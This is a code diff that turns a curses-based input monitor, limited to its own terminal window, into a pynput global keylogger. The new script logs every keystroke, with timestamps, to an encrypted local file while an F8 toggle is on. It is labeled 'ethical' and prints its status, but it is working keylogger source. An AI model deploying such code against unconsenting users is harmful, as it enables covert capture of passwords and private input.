@@ -1,10 +1,11 @@
-import curses
-from datetime import datetime
+from pynput import keyboard
 from cryptography.fernet import Fernet
-import os
+from datetime import datetime
 
 LOG_FILE = "logs.enc"
 KEY_FILE = "key.key"
+
+logging_enabled = False
 
 # Load encryption key
 with open(KEY_FILE, "rb") as f:
@@ -12,49 +13,39 @@ with open(KEY_FILE, "rb") as f:
 
 cipher = Fernet(key)
 
-def save(entry):
+def save_encrypted(entry):
     encrypted = cipher.encrypt(entry.encode())
     with open(LOG_FILE, "ab") as f:
         f.write(encrypted + b"\n")
 
-def main(stdscr):
-    curses.cbreak()
-    stdscr.keypad(True)
-    stdscr.nodelay(False)
+def on_press(key):
+    global logging_enabled
+    if not logging_enabled:
+        return
 
-    logging_enabled = False
+    try:
+        entry = f"{datetime.now()} | {key.char}"
+    except AttributeError:
+        entry = f"{datetime.now()} | [{key}]"
 
-    stdscr.clear()
-    stdscr.addstr(0, 0, "WSL Ethical Input Monitor")
-    stdscr.addstr(2, 0, "F8  = Start / Stop logging")
-    stdscr.addstr(3, 0, "ESC = Exit")
-    stdscr.addstr(5, 0, "Status: LOGGING OFF")
-    stdscr.refresh()
+    save_encrypted(entry)
 
-    while True:
-        key = stdscr.getch()
+def on_release(key):
+    global logging_enabled
 
-        if key == 27:  # ESC
-            break
+    # Toggle logging with F8
+    if key == keyboard.Key.f8:
+        logging_enabled = not logging_enabled
+        print("[+] Logging ON" if logging_enabled else "[-] Logging OFF")
 
-        if key == curses.KEY_F8:
-            logging_enabled = not logging_enabled
-            status = "LOGGING ON" if logging_enabled else "LOGGING OFF"
-            stdscr.addstr(5, 0, f"Status: {status}      ")
-            stdscr.refresh()
-            continue
+    # Exit with ESC
+    if key == keyboard.Key.esc:
+        print("[!] Exiting")
+        return False
 
-        if logging_enabled:
-            try:
-                char = chr(key)
-            except ValueError:
-                char = f"[{key}]"
+print("Ethical Keylogger Running")
+print("F8 = Start / Stop logging")
+print("ESC = Exit")
 
-            entry = f"{datetime.now()} | {char}"
-            save(entry)
-
-    stdscr.clear()
-    stdscr.addstr(0, 0, "Exiting safely...")
-    stdscr.refresh()
-
-curses.wrapper(main)
+with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
